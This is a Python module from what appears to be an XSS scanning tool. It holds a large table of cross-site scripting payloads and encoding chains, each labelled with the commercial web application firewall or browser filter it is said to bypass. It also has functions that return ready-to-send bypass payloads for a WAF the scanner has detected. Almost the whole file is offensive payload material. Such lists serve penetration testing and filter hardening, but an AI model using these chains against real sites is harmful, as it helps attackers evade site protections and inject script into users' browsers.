"""Modern WAF / Filter bypass chains.

This module applies COMBINATIONS of transforms to a payload to bypass
specific WAFs and browser filters.  Unlike transform.py (which applies
single transforms), this module produces tested CHAINS that defeat
real-world WAFs (Cloudflare, AWS WAF, ModSecurity, Akamai, F5, Imperva,
Wordfence, Sucuri, etc.).

Each bypass chain is keyed by WAF name; the scanner can pick the right
chain after waf.detect() identifies the WAF in front of the target.

Chains are organized as: (waf_key, base_payload, transform_chain, why).
Multiple chains per WAF give the scanner alternatives when the first
chain fails -- real-world WAFs have version-specific behaviors, so
having 3-5 chains per vendor dramatically improves bypass yield.
"""
from __future__ import annotations

# Each chain: (waf_name, base_payload, transform_chain, why_it_works)
# transform_chain is a list of transform.py function names applied in order.
BYPASS_CHAINS: list[tuple[str, str, list[str], str]] = [
    # ====================================================================
    # Cloudflare (multiple variants -- CF rolls out rules frequently)
    # ====================================================================
    ("cloudflare",
     "<svg/onload=alert(1)>",
     ["html_entity_named", "mixed_case"],
     "Cloudflare blocks raw <script> but allows HTML-entity-encoded SVG onload"),
    ("cloudflare",
     "<img src=x onerror=alert(1)>",
     ["mixed_case", "comment_break"],
     "Cloudflare WAF: mixed case + comment break defeats the <script> regex"),
    ("cloudflare",
     "<svg onload=alert(1)>",
     ["constructor_escape"],
     "Cloudflare: constructor-based alert bypasses string-match on 'alert('"),
    ("cloudflare",
     "<script>alert(1)</script>",
     ["js_unicode", "html_entity_named"],
     "Cloudflare: JavaScript unicode escapes + HTML entities bypass signature"),
    ("cloudflare",
     "<svg/onload=window['ale'+'rt'](1)>",
     ["mixed_case"],
     "Cloudflare: string concatenation in window[...] bypasses 'alert' match"),
    ("cloudflare",
     "<iframe src=\"javascript:alert(1)\">",
     ["fullwidth"],
     "Cloudflare: fullwidth Unicode characters bypass ASCII signature"),
    ("cloudflare",
     "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
     ["mixed_case"],
     "Cloudflare: Math/mglyph mutation bypass (HTML parsing ambiguity)"),

    # ====================================================================
    # AWS WAF
    # ====================================================================
    ("aws_waf",
     "<script>top['ale'+'rt'](1)</script>",
     ["comment_break"],
     "AWS WAF string-match on 'alert' bypassed by string concatenation"),
    ("aws_waf",
     "<img src=x onerror=window['alert'](1)>",
     ["mixed_case"],
     "AWS WAF: window['alert'] bypasses the alert( keyword match"),
    ("aws_waf",
     "<svg onload=eval(atob('YWxlcnQoMSk='))>",
     ["mixed_case"],
     "AWS WAF: base64-encoded payload via eval(atob(...)) bypasses keyword"),
    ("aws_waf",
     "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
     ["mixed_case"],
     "AWS WAF: hex-escaped eval bypasses 'alert' string match"),
    ("aws_waf",
     "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
     ["mixed_case"],
     "AWS WAF: data URI iframe bypasses script-src inspection"),

    # ====================================================================
    # ModSecurity / OWASP CRS
    # ====================================================================
    ("modsecurity",
     "<img src=x onerror=window['alert'](1)>",
     ["mixed_case", "comment_break"],
     "ModSecurity blocks alert( but not window['alert']("),
    ("modsecurity",
     "<script>eval(atob('YWxlcnQoMSk='))</script>",
     ["mixed_case"],
     "ModSecurity CRS: base64 eval bypasses keyword signatures"),
    ("modsecurity",
     "<svg/onload=window['ale'+'rt'](1)>",
     ["html_entity_named"],
     "ModSecurity: HTML entity encoding + string concat bypass"),
    ("modsecurity",
     "<script>Function('ale'+'rt(1)')()</script>",
     ["mixed_case"],
     "ModSecurity: Function constructor bypasses eval/alert match"),
    ("modsecurity",
     "<img src=x onerror=\"window['alert'].call(this,1)\">",
     ["comment_break"],
     "ModSecurity: .call(this,...) variant bypasses regex"),
    ("modsecurity",
     "<form><button formaction=javascript:alert(1)>x",
     ["mixed_case"],
     "ModSecurity: formaction attribute bypasses <script> filter"),

    # ====================================================================
    # Akamai
    # ====================================================================
    ("akamai",
     "<Script >alert(1)</Script>",
     ["mixed_case"],
     "Akamai case-sensitive match bypassed via mixed case"),
    ("akamai",
     "<svg/onload=alert(1)>",
     ["mixed_case", "comment_break"],
     "Akamai: SVG onload with comment break bypasses <script> regex"),
    ("akamai",
     "<img src=x onerror=alert(1)>",
     ["fullwidth"],
     "Akamai: fullwidth Unicode bypasses ASCII-only signatures"),
    ("akamai",
     "<script x>alert`1`</script>",
     ["mixed_case"],
     "Akamai: template-literal alert`1` bypasses alert( match"),
    ("akamai",
     "<iframe src=\"javascript:alert(1)\">",
     ["html_entity_named"],
     "Akamai: HTML entities in javascript: URI bypass URL filter"),

    # ====================================================================
    # F5 ASM / BIG-IP
    # ====================================================================
    ("f5_asm",
     "<img src=x onerror\t=alert(1)>",
     ["null_byte"],
     "F5 ASM blocks onerror= but not onerror<tab>="),
    ("f5_asm",
     "<svg/onload=alert(1)>",
     ["mixed_case", "tab_break"],
     "F5 ASM: tab breaks inside tag bypass signature"),
    ("f5_asm",
     "<script>alert(1)</script>",
     ["interleave_nulls"],
     "F5 ASM: null-byte interleaving defeats ASCII match"),
    ("f5_asm",
     "<img src=x onerror=window['alert'](1)>",
     ["comment_break"],
     "F5 ASM: comment break + window[...] bypass"),

    # ====================================================================
    # Imperva Incapsula
    # ====================================================================
    ("imperva",
     "<svg/onload=alert(1)>",
     ["mixed_case"],
     "Imperva blocks <svg onload but not <svg/onload"),
    ("imperva",
     "<img src=x onerror=window['ale'+'rt'](1)>",
     ["mixed_case"],
     "Imperva: string concat in window[...] bypasses alert match"),
    ("imperva",
     "<script>eval(atob('YWxlcnQoMSk='))</script>",
     ["mixed_case"],
     "Imperva: base64 eval bypass"),
    ("imperva",
     "<form><button formaction=javascript:alert(1)>x",
     ["mixed_case"],
     "Imperva: formaction javascript: URI bypass"),
    ("imperva",
     "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
     ["mixed_case"],
     "Imperva: data URI iframe bypass"),

    # ====================================================================
    # Wordfence
    # ====================================================================
    ("wordfence",
     "<script>alert`1`</script>",
     ["constructor_escape"],
     "Wordfence blocks alert(1) but not template-literal alert`1`"),
    ("wordfence",
     "<script>window['alert'](1)</script>",
     ["mixed_case"],
     "Wordfence: window['alert'] bypasses alert( match"),
    ("wordfence",
     "<svg onload=eval(atob('YWxlcnQoMSk='))>",
     ["mixed_case"],
     "Wordfence: base64 eval bypass"),
    ("wordfence",
     "<img src=x onerror=\"window['alert'].call(this,1)\">",
     ["comment_break"],
     "Wordfence: .call() variant bypasses signature"),

    # ====================================================================
    # Sucuri
    # ====================================================================
    ("sucuri",
     "<svg/onload=alert(1)>",
     ["mixed_case", "comment_break"],
     "Sucuri: SVG onload + comment break bypasses <script> regex"),
    ("sucuri",
     "<script>eval(atob('YWxlcnQoMSk='))</script>",
     ["mixed_case"],
     "Sucuri: base64 eval bypass"),
    ("sucuri",
     "<img src=x onerror=window['ale'+'rt'](1)>",
     ["html_entity_named"],
     "Sucuri: HTML entities + string concat bypass"),

    # ====================================================================
    # Barracuda
    # ====================================================================
    ("barracuda",
     "<Script>alert(1)</Script>",
     ["mixed_case"],
     "Barracuda: case-sensitive match bypassed via mixed case"),
    ("barracuda",
     "<svg/onload=alert(1)>",
     ["comment_break"],
     "Barracuda: SVG onload + comment break"),

    # ====================================================================
    # FortiWeb
    # ====================================================================
    ("fortiweb",
     "<svg/onload=alert(1)>",
     ["fullwidth"],
     "FortiWeb: fullwidth Unicode bypasses ASCII signature"),
    ("fortiweb",
     "<script>eval(atob('YWxlcnQoMSk='))</script>",
     ["mixed_case"],
     "FortiWeb: base64 eval bypass"),

    # ====================================================================
    # Citrix Netscaler
    # ====================================================================
    ("citrix",
     "<Script>alert(1)</Script>",
     ["mixed_case", "comment_break"],
     "Citrix: mixed case + comment break"),
    ("citrix",
     "<svg/onload=window['alert'](1)>",
     ["html_entity_named"],
     "Citrix: HTML entities + window[...] bypass"),

    # ====================================================================
    # ASP.NET Request Validation
    # ====================================================================
    ("aspnet",
     "<%3Cscript>alert(1)<%2Fscript>",
     ["url_encode_selective"],
     "ASP.NET: URL-encoded < > bypasses request validation"),
    ("aspnet",
     "<img src=x onerror=alert(1)>",
     ["mixed_case", "comment_break"],
     "ASP.NET: mixed case + comment break bypasses signature"),

    # ====================================================================
    # Tencent / Alibaba / Baidu Cloud WAFs
    # ====================================================================
    ("tencent",
     "<svg/onload=alert(1)>",
     ["fullwidth", "mixed_case"],
     "Tencent Cloud WAF: fullwidth Unicode + mixed case bypass"),
    ("tencent",
     "<script>eval(atob('YWxlcnQoMSk='))</script>",
     ["mixed_case"],
     "Tencent Cloud WAF: base64 eval bypass"),

    ("alibaba",
     "<svg/onload=alert(1)>",
     ["html_entity_named", "mixed_case"],
     "Alibaba Cloud WAF: HTML entities + mixed case bypass"),
    ("alibaba",
     "<img src=x onerror=window['ale'+'rt'](1)>",
     ["comment_break"],
     "Alibaba Cloud WAF: comment break + string concat"),

    ("baidu",
     "<Script>alert(1)</Script>",
     ["mixed_case"],
     "Baidu Cloud WAF: mixed case bypass"),

    # ====================================================================
    # Browser XSS filters (legacy, mostly removed)
    # ====================================================================
    # Internet Explorer / Edge HTML filter: blocks `script` but allows
    # `scr\x00ipt` (null byte insertion).
    ("ie_xss_filter",
     "<scr\x00ipt>alert(1)</scr\x00ipt>",
     ["null_byte", "interleave_nulls"],
     "IE/Edge XSS filter bypassed by null byte insertion"),

    # Chrome XSS Auditor (legacy, removed in Chrome 78): blocks exact
    # reflection; bypassed by adding an extra attribute the server
    # would not echo verbatim.
    ("chrome_auditor",
     "<script x>alert(1)</script>",
     ["duplicate_attribute"],
     "Chrome Auditor exact-match bypassed by extra attribute"),

    # Firefox was less aggressive; multi-encoding chains worked.
    ("firefox_filter",
     "<script>alert(1)</script>",
     ["html_entity_named", "js_unicode"],
     "Firefox: HTML entities + JS unicode escapes"),

    # ====================================================================
    # Generic fallbacks (when WAF is unknown)
    # ====================================================================
    ("generic",
     "<svg/onload=alert(1)>",
     ["html_entity_named", "mixed_case", "comment_break"],
     "Generic WAF bypass: HTML entity + mixed case + comment break"),
    ("generic",
     "<img src=x onerror=alert(1)>",
     ["mixed_case", "comment_break"],
     "Generic WAF bypass: mixed case + comment break"),
    ("generic",
     "<script>eval(atob('YWxlcnQoMSk='))</script>",
     ["mixed_case"],
     "Generic WAF bypass: base64-encoded payload via eval(atob())"),
    ("generic",
     "<svg/onload=window['ale'+'rt'](1)>",
     ["html_entity_named"],
     "Generic WAF bypass: HTML entities + string concat"),
    ("generic",
     "<img src=x onerror=alert(1)>",
     ["fullwidth"],
     "Generic WAF bypass: fullwidth Unicode characters"),
    ("generic",
     "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
     ["mixed_case"],
     "Generic WAF bypass: data URI iframe"),
    ("generic",
     "<form><button formaction=javascript:alert(1)>x",
     ["mixed_case"],
     "Generic WAF bypass: formaction javascript: URI"),
    ("generic",
     "<script>Function('ale'+'rt(1)')()</script>",
     ["mixed_case"],
     "Generic WAF bypass: Function constructor + string concat"),
]


def chains_for_waf(waf_name: str | None) -> list[tuple[str, str, list[str], str]]:
    """Return all bypass chains for the given WAF, or generic chains if
    the WAF is unknown/None."""
    if not waf_name:
        return [c for c in BYPASS_CHAINS if c[0] == "generic"]
    waf_lower = waf_name.lower().replace(" ", "_").replace("-", "_")
    out = []
    for name, payload, chain, why in BYPASS_CHAINS:
        norm = name.lower().replace(" ", "_").replace("-", "_")
        if norm == waf_lower or waf_lower in norm or norm in waf_lower:
            out.append((name, payload, chain, why))
    if not out:
        out = [c for c in BYPASS_CHAINS if c[0] == "generic"]
    return out


def best_chain_for_waf(waf_name: str | None) -> tuple[str, str, list[str], str] | None:
    """Return the single best bypass chain for the WAF, or None."""
    chains = chains_for_waf(waf_name)
    return chains[0] if chains else None


def apply_chain(payload: str, chain: list[str]) -> str:
    """Apply a transform chain to a payload.

    Imports transform.py lazily so this module can be used standalone.
    Uses the REGISTRY (which maps registry names like 'html_entity_named'
    to the actual transform functions) so chain authors can use the same
    names that scanner.py uses.
    """
    from . import transform as t
    out = payload
    for step in chain:
        fn = t.REGISTRY.get(step)
        if fn is None:
            # Fall back to module attribute lookup (in case a chain uses
            # the raw function name like 't_mixed_case').
            fn = getattr(t, step, None)
        if fn:
            try:
                out = fn(out)
            except Exception:
                pass  # skip transforms that don't apply
    return out


def bypass_for_waf(waf_name: str | None, payload: str | None = None) -> str | None:
    """Return a ready-to-send bypass payload for the WAF.

    If `payload` is given, apply the chain to it; otherwise use the
    chain's base payload.
    """
    chain = best_chain_for_waf(waf_name)
    if not chain:
        return None
    _, base, transforms, _ = chain
    target = payload if payload is not None else base
    return apply_chain(target, transforms)


def all_bypass_payloads(waf_name: str | None) -> list[dict]:
    """Return all bypass payloads for a WAF as a list of dicts.

    Each dict: {"waf": str, "payload": str, "transforms": list, "reason": str}
    """
    out = []
    for name, base, chain, why in chains_for_waf(waf_name):
        try:
            payload = apply_chain(base, chain)
        except Exception:
            payload = base
        out.append({
            "waf": name,
            "payload": payload,
            "transforms": chain,
            "reason": why,
        })
    return out


def supported_wafs() -> list[str]:
    """Return the list of WAFs that have at least one bypass chain."""
    seen = []
    for name, _, _, _ in BYPASS_CHAINS:
        if name not in seen:
            seen.append(name)
    return seen
